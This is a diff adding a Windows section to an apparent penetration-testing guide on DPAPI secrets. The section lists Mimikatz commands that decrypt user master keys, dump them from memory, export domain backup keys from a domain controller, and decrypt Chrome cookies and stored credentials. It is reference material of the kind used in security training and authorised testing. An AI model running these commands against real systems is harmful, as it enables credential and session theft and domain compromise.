@@ -36,3 +36,22 @@ C:\Users\$USER\AppData\Roaming\Microsoft\Credentials\
     ```
     !!! note
         need at least local admin privilege on the remote target, use **--local-auth** if your user is a local account
+=== "Windows"
+    On Windows systems Mimikatz (C) can be used to extract dpapi with `lsadump::backupkeys`, decrypt with `dpapi::chrome` and `dpapi::cred` or use specific master keys with `dpapi::masterkey` and `sekurlsa::dpapi` , using specified passwords or given sufficient privileges.
+    ```bash
+    # Extract and decrypt a master key
+    dpapi::masterkey /in:"C:\Users\$USER\AppData\Roaming\Microsoft\Protect\$SUID\$GUID" /sid:$SID /password:$PASSWORD /protected
+
+    # Extract and decrypt all master keys
+    sekurlsa::dpapi
+
+    # Extract the backup keys & use it to decrypt a master key
+    lsadump::backupkeys /system:$DOMAIN_CONTROLLER /export
+    dpapi::masterkey /in:"C:\Users\$USER\AppData\Roaming\Microsoft\Protect\$SUID\$GUID" /pvk:$BACKUP_KEY_EXPORT_PVK
+
+    # Decrypt Chrome data
+    dpapi::chrome /in:"%localappdata%\Google\Chrome\User Data\Default\Cookies"
+
+    # Decrypt DPAPI-protected data using a master key
+    dpapi::cred /in:"C:\path\to\encrypted\file" /masterkey:$MASTERKEY
+    ```
